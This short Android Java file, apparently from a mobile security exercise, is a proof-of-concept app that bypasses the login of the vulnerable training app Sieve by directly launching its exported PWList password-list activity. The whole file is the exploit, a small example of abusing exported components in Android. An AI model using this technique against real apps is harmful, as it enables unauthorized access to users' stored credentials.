// this is created in android studio with the template "empty activity"
package com.hacking.sieveloginbypass;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // code - to start the following Activity
        // com.mwr.example.sieve / .PWList
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.mwr.example.sieve","com.mwr.example.sieve.PWList"));
        startActivity(intent);


    }
}